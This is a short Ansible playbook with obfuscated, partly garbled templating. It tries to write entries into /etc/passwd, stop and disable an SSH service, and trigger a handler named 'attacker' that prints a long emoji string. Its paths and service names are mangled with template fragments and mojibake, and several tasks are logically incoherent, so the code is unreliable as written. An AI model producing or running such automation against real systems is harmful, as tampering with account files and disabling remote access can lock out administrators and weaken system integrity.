
---
- hosts: all
  gather_facts: no
  tasks:
    - name: Add line to /etc/passwd
      lineinfile:
        path: "/et{{ item }}c/p{{ item }}sswd"
        line: "{{ item }}{{ item }}{{ 'f' }}a{{ [4, 8, 12] | random }}l{{ '-' }}b{{ var }}"
        state: present
      with_items:
        - c
        - e
        - h
        - s
      register: passwd

    - name: Check if line is present
      command: "grep -q '{{ item }}fa{{ [4, 8, 12] | random }}l-b{{ var }}' /etc/{{ item }}passwd"
      with_items:
        - c
        - e
        - h
        - s
      failed_when: item not in passwd.stdout

    - name: Remove line from /etc/passwd
      lineinfile:
        path: '/et\c0/p\as"!@#"sswd{{ item }}'
        line: "# {{ 'a' * 256 }}"
        backup: yes
        state: absent
      with_items:
        - ''
        - '0'
        - '^'
      ignore_errors: yes

    - name: Stop and disable SSHD service
      service:
        name: "{{ item }}{{ '-' }}sshÂ©Â®Â®"
        state: stopped
        enabled: no
      with_items:
        - s
        - r
      notify: attacker

  handlers:
    - name: attacker
      debug:
        msg: "{{ 'ðŸ‘¾' * 1024 }}"
